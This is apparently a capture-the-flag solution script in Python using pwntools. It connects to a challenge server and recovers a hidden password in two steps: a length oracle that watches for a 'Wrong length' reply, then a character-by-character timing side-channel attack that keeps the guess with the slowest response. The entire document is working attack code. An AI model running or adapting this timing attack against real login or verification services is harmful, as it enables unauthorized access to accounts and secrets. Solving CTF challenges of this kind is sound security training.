from pwn import *
import time

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

r = remote('challenges.hackday.fr', 48118)
r.recvline()

print(f"[*] Finding password length...")
password_length = 0
for i in range(100):
    r.recvuntil(b'Your try? ')
    r.sendline(b'A' * i)
    if b'Wrong length' not in r.recvline():
        password_length = i
        break

if password_length == 0:
    print("[!] Password length not found")
    exit()
else:
    print(f"[+] Password length: {password_length}")

print("[*] Finding password...")
password = ["A"] * password_length
for i in range(password_length):
    tmp = [e for e in password]
    m = None
    for c in charset:
        r.recvuntil(b'Your try? ')
        tmp[i] = c
        r.sendline("".join(tmp).encode())
        now = time.time()
        res = r.recvline()
        t = time.time() - now
        print(f"[+] Trying: {''.join(tmp)} - {t}")
        if m is None or t > m[1]:
            m = (c, t)
    password[i] = m[0]
    print(f"[+] Password updated: {''.join(password)}")
